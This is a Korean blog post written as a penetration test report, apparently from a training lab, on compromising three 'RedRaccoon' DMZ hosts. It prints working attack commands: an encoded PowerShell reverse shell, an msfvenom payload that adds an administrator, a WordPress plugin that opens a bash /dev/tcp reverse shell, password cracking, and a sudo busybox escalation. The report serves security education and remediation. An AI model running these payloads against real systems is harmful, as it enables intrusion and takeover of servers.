---
title: '[BHPT] RedRaccoon 모의해킹 결과 보고서'
layout: post
date: 2026-11-09 12:00:00 +0900
---

# 모의해킹 결과 보고서

## 개요

### 총평

| 분석 기간 | IP 대역 | 목적 |
|---|:---:|---:
| 2026년 2월 16일 ~ 2026년 2월 18일 | TARGET_IP/28 | 보안 취약점 진단 및 침투테스트 |

본 보고서는 2026년 2월 16일부터 18일까지 RedRaccoon사의 DMZ 구간에 위치한 호스트를 대상으로 수행한 모의해킹 결과를 요약한다. 본 점검에서는 외부 공격자가 인증 없이 시스템에 접근하여 권한 상승을 통해 최종적으로 서버를 장악할 수 있는지 여부를 중점적으로 검증하였다.

점검 결과, 스테이징 서버(TARGET_IP)에서는 **익명 FTP 접근 허용**, **웹 애플리케이션 파일 업로드 검증 미흡**, **관리자 권한으로 실행되는 서비스의 파일 권한 설정 오류**가 확인되었다. 공격자는 익명 FTP 로그인을 통해 웹 애플리케이션 소스 코드를 열람하고 업로드 기능을 분석하여 웹 서비스 계정(`xampp`) 권한의 원격 명령 실행에 성공하였다. 이후 자동 실행 서비스의 실행 파일 경로에 일반 사용자 쓰기 권한이 부여된 점을 악용하여 로컬 관리자 권한을 획득하였다.

또한 DMZ 구간의 WordPress 서버(TARGET_IP)에서는 **백업 디렉터리 노출**, **민감 정보가 포함된 문서 파일 노출**, **WordPress 관리자 계정 정보 유출**, **플러그인 업로드 기능을 통한 원격 코드 실행**, **sudo 설정 오류**가 연쇄적으로 확인되었다. 공격자는 노출된 엑셀 파일에서 관리자 계정 정보를 획득한 후 WordPress 관리자 페이지에 접근하여 악성 플러그인을 업로드함으로써 웹 서버 권한을 획득하였으며, 이후 `sudo` 권한이 부여된 `busybox` 바이너리를 이용해 최종적으로 root 권한을 획득하였다.

TARGET_IP 호스트에서는 CouchDB 1.6.1 버전의 취약점을 이용하여 **Docker 컨테이너 내부 접근에는 성공**하였으나, 초기 침투 및 권한 상승은 실패하였다. 컨테이너 내부에서는 서비스 계정(`[REDACTED_USER]`)의 자격 증명이 평문으로 존재하며, 주기적 백업 스크립트가 root 권한으로 실행되고 있었다. 하지만 컨테이너 격리 및 파일 권한 설정으로 인해 추가 권한 상승이나 호스트 장악은 불가능하였다.


## 진단 결과 요약

아래 표는 이번 모의해킹 과정에서 확인된 주요 취약점을 요약한 것이다. 각 취약점에 대한 상세 내용 및 대응 방안은 본 보고서의 **‘취약점 및 대응 방안’** 항목에서 확인할 수 있다.

| 번호 | 이름 | 중요도 | 설명 | 대응 방안 |
|---|:---:|:---:|---|---|
| 1 | 익명 FTP 접근 허용 | 중 | FTP 서비스에서 anonymous 로그인이 허용되어 웹 소스 코드 열람 가능 | 익명 FTP 비활성화 및 계정 기반 인증 적용 |
| 2 | 파일 업로드 검증 미흡 | 중 | 웹 애플리케이션에서 파일 업로드 검증이 불충분하여 원격 코드 실행 가능 | 업로드 파일 검증 강화 및 실행 경로 분리 |
| 3 | 서비스 파일 권한 설정 오류 | 중 | 관리자 권한으로 실행되는 서비스 실행 파일에 일반 사용자 쓰기 권한 존재 | 서비스 실행 파일 및 디렉터리 권한 재설정 |
| 4 | 민감 정보 파일 노출 | 중 | 백업 디렉터리에 자격 증명이 포함된 문서 파일 노출 | 백업 파일 접근 통제 및 외부 노출 차단 |
| 5 | WordPress 플러그인 업로드 악용 | 중 | 악성 플러그인 업로드를 통해 웹 서버 원격 명령 실행 가능 | 플러그인 업로드 제한 및 보안 설정 강화 |
| 6 | sudo 설정 오류 | 중 | www-data 계정이 NOPASSWD sudo 명령 실행 가능하여 root 권한 획득 가능 | 불필요한 sudo 권한 제거 및 최소 권한 원칙 적용 |
| 7 | CouchDB 원격 코드 실행 (컨테이너 내부) | 중 | CouchDB 1.6.1 취약점을 통해 Docker 컨테이너 내부 명령 실행 가능 | CouchDB 최신 버전으로 업데이트 및 외부 접근 통제 |
| 8 | Cron 작업 권한 설정 오류 | 중 | root 권한으로 실행되는 Cron 작업에서 실행 파일(/opt/backup/continuous-backup.py)에 대한 권한 검증이 미흡하여, 공격자가 해당 파일 또는 경로를 조작할 경우 임의 명령 실행 가능 | Cron 작업에 사용되는 스크립트 및 디렉터리의 소유자·권한을 root 전용으로 제한하고, 일반 사용자 쓰기 권한 제거 |

# 호스트 TARGET_IP

## 모의해킹 수행 내용
### 정보 수집
대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.
```
└─# nmap -sS -p- --max-retries 1 -Pn -n --open TARGET_IP --min-rate 1500 -oA fullport
Starting Nmap 7.94 ( https://nmap.org ) at 2026-02-16 04:06 UTC
Nmap scan report for TARGET_IP
Host is up (0.00030s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
49664/tcp open  unknown
49669/tcp open  unknown
49679/tcp open  unknown
MAC Address: 0A:FB:09:9B:31:A9 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 87.64 seconds
```

포트 스캔 결과 포트 21,80,49664,49669,49679이 열려있었고, 다른 포트들은 모두 닫히거나 필터링 된 상태였다. 해당 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.
```
└─# nmap -p 21,80,49664,49669,49679 -sV -sC -Pn -n --open TARGET_IP --min-rate 1000 -oA tcpDetailed
Starting Nmap 7.94 ( https://nmap.org ) at 2026-02-16 04:11 UTC
Nmap scan report for TARGET_IP
Host is up (0.00018s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     FileZilla ftpd 0.9.41 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r-- 1 ftp ftp           2877 Dec 23  2023 index.php
|_-rw-r--r-- 1 ftp ftp           1602 Dec 23  2023 upload.php
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http    Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Welcome to Our Website
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
49664/tcp open  msrpc   Microsoft Windows RPC
49669/tcp open  msrpc   Microsoft Windows RPC
49679/tcp open  msrpc   Microsoft Windows RPC
MAC Address: 0A:FB:09:9B:31:A9 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.01 seconds
```

FTP 서비스에서 **익명 로그인(anonymous)** 이 허용되어 있음을 확인하였으며, 웹 애플리케이션의 동작 방식을 분석하기 위해 `index.php` 및 `upload.php` 파일을 로컬 환경으로 다운로드하였다.
```
└─# ftp TARGET_IP
Connected to TARGET_IP.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (TARGET_IP:root): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||55526|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive off
Passive mode: off; fallback to active mode: off.
ftp> ls
200 Port command successful
150 Opening data channel for directory list.
-rw-r--r-- 1 ftp ftp           2877 Dec 23  2023 index.php
-rw-r--r-- 1 ftp ftp           1602 Dec 23  2023 upload.php
226 Transfer OK
ftp> get index.php
local: index.php remote: index.php
200 Port command successful
150 Opening data channel for file transfer.
100% |***************************************************************************************|  2877       19.18 MiB/s    00:00 ETA
226 Transfer OK
2877 bytes received in 00:00 (10.63 MiB/s)
ftp> get upload.php
local: upload.php remote: upload.php
200 Port command successful
150 Opening data channel for file transfer.
100% |***************************************************************************************|  1602       12.94 MiB/s    00:00 ETA
226 Transfer OK
1602 bytes received in 00:00 (1.02 MiB/s)
```






```
└─# cat index.php 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RedRaccoon Staging Server</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 80%;
            margin: auto;
            overflow: hidden;
        }
        header {
            background: #50b3a2;
            color: white;
            padding-top: 30px;
            min-height: 70px;
            border-bottom: #e8491d 3px solid;
        }
        header a {
            color: #ffffff;
            text-decoration: none;
            text-transform: uppercase;
            font-size: 16px;
        }
        header ul {
            padding: 0;
            list-style: none;
            text-align: center;
        }
        header li {
            display: inline;
            margin: 0 15px;
        }
        header #branding {
            float: left;
        }
        header #branding h1 {
            margin: 0;
        }
        header nav {
            float: right;
            margin-top: 10px;
        }
        header .highlight, header .current a {
            color: #e8491d;
            font-weight: bold;
        }
        header a:hover {
            color: #ffffff;
            font-weight: bold;
        }
        .banner {
            padding: 40px 0;
            background: #e8491d;
            color: white;
            text-align: center;
        }
        .banner h1 {
            font-size: 2em;
        }
        .welcome {
            padding: 20px 0;
            text-align: center;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div id="branding">
                <h1><span class="highlight">Our</span> Website</h1>
            </div>
            <nav>
                <ul>
                    <li class="current"><a href="index.php">Home</a></li>
                    <li><a href="#">About</a></li>
                    <li><a href="#">Services</a></li>
                    <li><a href="#">Contact</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <div class="banner">
        <h1>Landing Page Staging phase 2 </h1>
    </div>

    <div class="container">
        <section class="welcome">
            <h2>Simple, Effective, Awesome</h2>
            <p>Docker testo - did my staging work?</p>
        </section>
    </div>

        <form action="upload.php" method="post" enctype="multipart/form-data">
  Select image to upload:
  <input type="file" name="fileToUpload" id="fileToUpload">
  <input type="submit" value="Upload Image" name="submit">
</form>

    <footer>['REQUEST_METHOD'] === 'POST') {
    $targetDir = "C:/uploads/"; // Change to a safer directory
    $fileName = basename($_FILES["fileToUpload"]["name"]);
    $targetFile = $targetDir . $fileName;
    $uploadOk = 1;
    $imageFileType = strtolower(pathinfo($targetFile, PATHINFO_EXTENSION));

    // Check if image file is an actual image or fake image
    if (isset($_POST["submit"])) {
        $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
        if ($check !== false && ($check["mime"] == "image/jpeg" || $check["mime"] == "image/png")) {
            echo "File is an image - " . $check["mime"] . ".";
            $uploadOk = 1;
        } else {
            echo "File is not an image.";
            $uploadOk = 0;
        }
    }

    // Check if file already exists
    if (file_exists($targetFile)) {
        echo "Sorry, file already exists.";
        $uploadOk = 0;
    }

    // Check file extension
    if (in_array($imageFileType, ["php", "php3", "php4", "php5", "phtml"])) {
        echo "Sorry, PHP files are not allowed.";
        $uploadOk = 0;
    }

    // Check if $uploadOk is set to 0 by an error
    if ($uploadOk == 0) {
        echo "Sorry, your file was not uploaded.";
    // If everything is ok, try to upload file
    } else {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo "The file ". htmlspecialchars($fileName) . " has been uploaded.";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }
}
?>   
```

### 초기 침투

다운로드 받은 php파일 list와 http://TARGET_IP/staging 경로가 같은 것을 파악했다.
```
└─# gobuster dir -u http://TARGET_IP/staging -w wordlist.txt                     
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/staging
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                wordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2877]
/.htaccess            (Status: 403) [Size: 299]
/upload.php           (Status: 200) [Size: 0]
/.htpasswd            (Status: 403) [Size: 299]
/.htpasswds           (Status: 403) [Size: 299]
Progress: 1828 / 1829 (99.95%)
===============================================================
Finished
===============================================================
```

FTP put 명령어로 파일 업로드가 가능하여 웹쉘을 업로드했다.
```
└─# ftp TARGET_IP
Connected to TARGET_IP.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (TARGET_IP:root): anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive off
Passive mode: off; fallback to active mode: off.
ftp> put exploit.php
local: exploit.php remote: exploit.php
ftp: Can't open `exploit.php': No such file or directory
ftp> exit
221 Goodbye
```

웹쉘을 통해 아래 리버싱 쉘을 실행시켰다.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image.png)
```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADYALgAyADMAMQAiACwAOQA5ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

공격자 pc에서 netcat으로 9989번을 열어두어 쉘을 얻는 것을 성공했다.
```
└─# nc -lvnp 9988
listening on [any] 9988 ...
connect to [TARGET_IP] from (UNKNOWN) [TARGET_IP] 56299

PS C:\xampp\htdocs\staging> whoami
rr-stage02-lega\xampp
```
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-1.png)

### 권한 상승
자동 실행되는 Windows 서비스 중 관리자 권한으로 실행되며, Unqouted 서비스 경로를 발견했다.또한 해당 서비스는 일반 사용자 쓰기 권한이 존재하는 것을 확인되었다.
```
PS C:\> Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notmatch '^\s*\".*\".*$' } | Select-Object Name, DisplayName, PathName, StartMode

Name                       DisplayName                          PathName                                               
----                       -----------                          --------                                               
RemoteSystemMonitorService TRIGONE Remote System Monitor Server C:\utils\Remote System Monitor Server\RemoteSystemMo...

PS C:\> icacls C:\utils
C:\utils BUILTIN\Users:(OI)(CI)(F)
         NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
         BUILTIN\Administrators:(I)(OI)(CI)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         BUILTIN\Users:(I)(CI)(AD)
         BUILTIN\Users:(I)(CI)(WD)
         CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

공격자 PC에서 msfvenom툴을 이용하여 xampp 그룹을 권한 상승시키는 악성 프로그램 서비스를 생성 한 뒤 http 서비스를 실행시킨다.
```
└─# msfvenom -p windows/x64/exec CMD="net localgroup administrators xampp /add" -f exe-service -o Remote.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 308 bytes
Final size of exe-service file: 48640 bytes
Saved as: Remote.exe
                                                                  
┌──(root㉿kali)-[~/host1]
└─# python -m http.server 80                                                                                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```


공격자 pc에서 생성한 악성 프로그램을 http로 다운로드 받았다.
```
PS C:\> cd utils
PS C:\utils> certutil.exe -urlcache -split -f http://TARGET_IP/Remote.exe Remote.exe
****  Online  ****
  0000  ...
  be00
CertUtil: -URLCache command completed successfully.

PS C:\utils> dir


    Directory: C:\utils


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       12/23/2023   6:15 PM                Remote System Monitor Server                                          
-a----        2/16/2026  12:54 PM          48640 Remote.exe  
```

해당 권한으로 RemoteSystemMonitorService 서비스가 실행이 되는 지 확인 한 뒤, 서비스를 재 실행하면 Administrators 그룹으로 권한 상승된 것을 확인 할 수 있다.
```
PS C:\utils> try{ Restart-Service -Name "RemoteSystemMonitorService" -WhatIf ; echo "You DO have permission to restart service." } catch { "You do NOT have permission to restart the service." }\
You DO have permission to restart service.
PS C:\utils> restart-service -name "RemoteSystemMonitorService"
PS C:\utils> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
xampp
The command completed successfully.
```
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-2.png)

### 취약점 분석 및 증거 스크린샷 포함

1. 익명 FTP 접근 허용
nmap을 통해 ftp 서비스가 anmonymous로 로그인이 가능한 것을 확인했음.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-3.png)
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-4.png)

2. 파일 업로드 검증 미흡
권한 검증 없이 anmonymous로 파일업로드가 가능한 것을 확인했음.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-5.png)

3. 서비스 파일 권한 설정 오류
Unquoted 서비스 경로가 발견되어 공백으로 파일명을 구분하여 실행시킬 수 있음.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-6.png)
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-7.png)



# 호스트 TARGET_IP

## 모의해킹 수행 내용
### 정보 수집
대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.
```
└─# nmap -sS -p- --max-retries 1 -Pn -n --open TARGET_IP --min-rate 1500 -oA fullport
Starting Nmap 7.94 ( https://nmap.org ) at 2026-02-17 06:37 UTC
Nmap scan report for TARGET_IP
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 0A:59:18:76:72:6F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
```

포트 스캔 결과 포트 22,80이 열려있었고, 다른 포트들은 모두 닫히거나 필터링 된 상태였다. 해당 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.
```
└─# nmap -p 22,80 -sV -sC -Pn -n --open TARGET_IP --min-rate 1000 -oA tcpDetailed
Starting Nmap 7.94 ( https://nmap.org ) at 2026-02-17 06:37 UTC
Nmap scan report for TARGET_IP
Host is up (0.000095s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1e:0b:f6:3d:9d:af:bb:10:32:fc:49:9d:ed:71:c7:f4 (ECDSA)
|_  256 e1:79:63:0f:4c:1f:97:15:5d:fb:2a:b3:1d:8e:45:2a (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 0A:59:18:76:72:6F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
```
디렉토리 브루트포싱을 통해 /blog/_backup 경로를 발견하였으며, 계정정보가 담긴 엑셀파일을 다운로드함.
```
└─# gobuster dir -u http://TARGET_IP/blog/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/blog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 275]
/_backup              (Status: 301) [Size: 315] [--> http://TARGET_IP/blog/_backup/]
/.hta                 (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/index.php            (Status: 301) [Size: 0] [--> http://TARGET_IP/blog/]
/wordpress            (Status: 301) [Size: 317] [--> http://TARGET_IP/blog/wordpress/]
/wp-admin             (Status: 301) [Size: 316] [--> http://TARGET_IP/blog/wp-admin/]
/wp-content           (Status: 301) [Size: 318] [--> http://TARGET_IP/blog/wp-content/]
/wp-includes          (Status: 301) [Size: 319] [--> http://TARGET_IP/blog/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

다운로드 받은 엑셀은 암호화되어 있었으며, office2john으로 추출한 hash파일을 john툴로 크래킹하면 패스워드를 얻을수 있는것을 확인하였음. 그리고 msoffcrypto-tool을 이용하여 발견한 비밀번호로 암호화 해제한 뒤 xlsx2csv툴을 이용한 뒤 엑셀파일을 열람할 수 있었다.
```
└─$ office2john corp-creds.xlsx > excel.hash
                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat excel.hash     
corp-creds.xlsx:[REDACTED_HASH]
                                                                                                                                    
┌──(kali㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt excel.hash        
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED_PASSWORD]          (corp-creds.xlsx)     
1g 0:00:00:00 DONE (2026-02-17 11:56) 4.166g/s 2133p/s 2133c/s 2133C/s [REDACTED_PASSWORD]..[REDACTED_PASSWORD]
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(kali㉿kali)-[~/Downloads]
└─$ msoffcrypto-tool corp-creds.xlsx decrypted.xlsx -p [REDACTED_PASSWORD]

                                                                                                                                    
┌──(kali㉿kali)-[~/Downloads]
└─$ xlsx2csv decrypted.xlsx
Username,Password,Location
[REDACTED_USER],[REDACTED_PASSWORD],https://redraccoon.okta.com
[REDACTED_USER],[REDACTED_PASSWORD],https://s3.console.aws.amazon.com/s3/home?region=ap-northeast-2#
[REDACTED_USER],[REDACTED_PASSWORD],ftp://TARGET_IP
admin,[REDACTED_PASSWORD],DMZ RedRaccoon Wordpress server http://<ip>/blog/wp-login.php
[REDACTED_USER],[REDACTED_PASSWORD],nfs://203.0.113.5
```

### 초기 침투

리버스 쉘 명령어가 담긴 워드프레스 플러그인 php을 작성 후 zip 파일로 압축.
```
└─$ cat plugin.php           
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: a
* Author URI: <http://www.a.com>
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/TARGET_IP/9988 0>&1'");


┌──(kali㉿kali)-[~/Desktop/ransom]
└─$ zip plugin.zip plugin.php 
  adding: plugin.php (deflated 28%)

```

엑셀 파일에서 발견한 관리자계정으로 로그인 후 Add Plugins 페이지에서 위에 압축한 파일 업로드 한 뒤 Activate Plugin 버튼을 클릭.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-8.png)
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-9.png)

공격자 pc에서 netcat으로 9989번을 열어두어 쉘을 얻는 것을 성공했다.
```
└─# nc -lvnp 9988                                                                       
listening on [any] 9988 ...
connect to [TARGET_IP] from (UNKNOWN) [TARGET_IP] 42890
bash: cannot set terminal process group (510): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dmz-prod-rrblog01:/var/www/html/blog/wp-admin$ id; hostname; ip a
id; hostname; ip a
uid=33(www-data) gid=33(www-data) groups=33(www-data)
dmz-prod-rrblog01
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 0a:59:18:76:72:6f brd ff:ff:ff:ff:ff:ff
    altname enp0s5
    inet TARGET_IP/28 metric 100 brd TARGET_IP scope global dynamic ens5
       valid_lft 2872sec preferred_lft 2872sec
    inet6 fe80::859:18ff:fe76:726f/64 scope link 
       valid_lft forever preferred_lft forever
www-data@dmz-prod-rrblog01:/var/www/html/blog/wp-admin$ 
```
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-11.png)

### 권한 상승

리버스 쉘을 업그레이드 시켰다.
```
www-data@dmz-prod-rrblog01:/var/www/html/blog/wp-admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<min$ python3 -c 'import pty;pty.spawn("/bin/bash")'    
www-data@dmz-prod-rrblog01:/var/www/html/blog/wp-admin$ ^Z
zsh: suspended  nc -lvnp 9988
                                            
┌──(root㉿kali)-[~/host2]
└─# stty raw -echo;fg
[1]  + continued  nc -lvnp 9988
                               reset
reset: unknown terminal type unknown
Terminal type? xterm
</www/html/blog/wp-admin$ export TERM=xterm-256color
```

sudo -l 옵션을 통해 busybox를 root 권한으로 사용할 수 있는것을 확인하였으며, sudo busybox ash 명령어를 통해 root권한을 얻는 것을 성공했다.
``` 
www-data@dmz-prod-rrblog01:/var/www/html/blog/wp-admin$ sudo -l
Matching Defaults entries for www-data on dmz-prod-rrblog01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on dmz-prod-rrblog01:
    (ALL) NOPASSWD: /bin/busybox
www-data@dmz-prod-rrblog01:/var/www/html/blog/wp-admin$ sudo busybox ash


BusyBox v1.30.1 (Ubuntu 1:1.30.1-7ubuntu3) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/var/www/html/blog/wp-admin # id; hostname; ip a
uid=0(root) gid=0(root) groups=0(root)
dmz-prod-rrblog01
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq qlen 1000
    link/ether 0a:59:18:76:72:6f brd ff:ff:ff:ff:ff:ff
    inet TARGET_IP/28 brd TARGET_IP scope global dynamic ens5
       valid_lft 2409sec preferred_lft 2409sec
    inet6 fe80::859:18ff:fe76:726f/64 scope link 
       valid_lft forever preferred_lft forever
```
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-10.png)

### 취약점 분석 및 증거 스크린샷 포함

1. 민감 정보 파일 노출
백업 디렉터리에 자격 증명이 포함된 문서 파일 노출되어 복호화 후 계정정보를 얻을 수 있었음.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-12.png)
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-redraccoon-report/image-13.png)

